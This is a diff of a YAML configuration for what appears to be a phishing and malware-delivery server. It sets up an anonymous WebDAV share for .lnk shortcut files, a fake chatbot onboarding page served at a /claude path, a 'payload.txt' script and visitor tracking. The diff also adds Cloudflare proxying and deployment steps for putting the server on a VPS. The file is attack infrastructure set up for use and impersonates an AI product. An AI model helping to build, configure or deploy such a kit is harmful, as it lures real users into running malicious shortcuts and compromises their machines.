@@ -8,23 +8,37 @@ app:
   version: "2.1.0"
   debug: false
 
+# ====================== Server ======================
+# LOCAL: port 80 (no SSL)
+# REMOTE (Cloudflare): port 443 (SSL handled by Cloudflare)
 server:
   host: "0.0.0.0"
-  port: 80
+  port: 80                    # Change to 443 for Cloudflare VPS
+  # ssl: false               # Uncomment for HTTPS (needs cert)
+  # cert_file: "cert.pem"    # SSL certificate path
+  # key_file: "key.pem"      # SSL key path
+
+# Cloudflare Deployment
+# - Set port to 443
+# - Cloudflare handles SSL termination
+# - No cert needed on server side
+cloudflare:
+  enabled: true               # Set true when behind Cloudflare
+  proxy_mode: true            # Cloudflare proxy handles HTTPS
 
 # ====================== WebDAV Configuration ======================
 webdav:
   enabled: true
   mount_path: "/dav"           # URL: https://domain.com/dav
-  root_folder: "dav"           # ← Đã đổi thành dav/
+  root_folder: "dav"           # dav/ folder
   anonymous: true
   verbose: 1
 
 # ====================== Template ======================
 template: "chatbot_onboarding.html"
-#modal_template: "onboarding_template.html"  # or "old_onboard_template.html"
 modal_template: "old_onboard_template.html"
-# ====================== Other Settings ======================
+
+# ====================== Payload ======================
 payload:
   enabled: true
   default_script: "payload.txt"
@@ -33,7 +47,22 @@ tracking:
   enabled: true
 
 # =============================================
-# Hướng dẫn:
-# - Đặt file .lnk vào thư mục dav/
-# - Truy cập trang: http://localhost:8080/claude
+# Deployment Guide:
+# 
+# LOCAL (no Cloudflare):
+#   - port: 80
+#   - cloudflare.enabled: false
+#   - Access: http://localhost/claude
+#
+# VPS with Cloudflare:
+#   - port: 443
+#   - cloudflare.enabled: true
+#   - Cloudflare auto-proxies HTTPS
+#   - No SSL cert needed on server
+#
+# VPS Standalone (no Cloudflare):
+#   - port: 443
+#   - ssl: true
+#   - cert_file: "/path/to/cert.pem"
+#   - key_file: "/path/to/key.pem"
 # =============================================
